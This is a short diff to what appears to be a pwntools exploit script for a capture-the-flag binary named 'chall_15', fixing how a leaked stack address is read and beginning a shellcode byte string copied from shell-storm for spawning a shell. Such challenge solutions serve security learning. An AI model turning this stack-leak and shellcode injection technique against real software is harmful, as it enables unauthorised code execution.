@@ -2,10 +2,10 @@ from pwn import *
 
 binary = context.binary = ELF('./chall_15')
 p = process(binary.path)
-p.recv()
 
-p.sendline()
-stack = int(leak,16)
+p.recvuntil('\n')
+_ = p.recvline().strip()
+stack = int(_,16)
 
 # http://shell-storm.org/shellcode/files/shellcode-905.php
 shellcode  = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52'
